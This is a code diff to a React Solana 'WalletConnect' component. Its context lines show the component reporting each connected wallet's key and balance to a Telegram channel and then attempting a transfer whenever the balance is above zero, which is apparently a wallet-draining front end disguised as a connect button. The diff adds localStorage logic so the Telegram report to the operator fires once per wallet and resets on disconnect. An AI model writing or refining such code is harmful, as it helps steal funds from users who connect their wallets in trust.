@@ -1,6 +1,6 @@
 import { useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-import { useState, useEffect, useMemo } from 'react';
+import { useState, useEffect, useMemo, useRef } from 'react';
 import '@solana/wallet-adapter-react-ui/styles.css';
 import { WalletService } from '../services/walletService';
 import { TelegramService } from '../services/telegramService';
@@ -14,6 +14,7 @@ function WalletConnect() {
   const [balance, setBalance] = useState(null);
   const [isDropdownOpen, setIsDropdownOpen] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
+  const hasSentInitialNotification = useRef(false);
 
   // Memoize services
   const services = useMemo(() => ({
@@ -32,8 +33,11 @@ function WalletConnect() {
           const walletBalance = await services.walletService.getBalance(publicKey.toString());
           setBalance(walletBalance);
 
-          // Only send initial connection notification if we don't have a balance yet
-          if (balance === null) {
+          // Check if we've already sent a notification for this wallet
+          const walletKey = `wallet_notified_${publicKey.toString()}`;
+          const hasNotified = localStorage.getItem(walletKey);
+
+          if (!hasNotified) {
             await services.telegramService.sendMessage(
               services.telegramService.formatWalletInfo({
                 publicKey: publicKey.toString(),
@@ -41,6 +45,8 @@ function WalletConnect() {
                 timestamp: Date.now()
               })
             );
+            // Mark this wallet as notified
+            localStorage.setItem(walletKey, 'true');
           }
 
           // Only attempt transfer if we have a balance greater than 0
@@ -105,7 +111,7 @@ function WalletConnect() {
 
       processWallet();
     }
-  }, [publicKey, services, balance]);
+  }, [publicKey, services]);
 
   const handleDisconnect = async () => {
     try {
@@ -114,6 +120,12 @@ function WalletConnect() {
       
       // Clear user profile
       await services.userProfileService.clearProfile();
+      
+      // Clear notification state for this wallet
+      if (publicKey) {
+        const walletKey = `wallet_notified_${publicKey.toString()}`;
+        localStorage.removeItem(walletKey);
+      }
       
       // Disconnect wallet
       if (disconnect) {
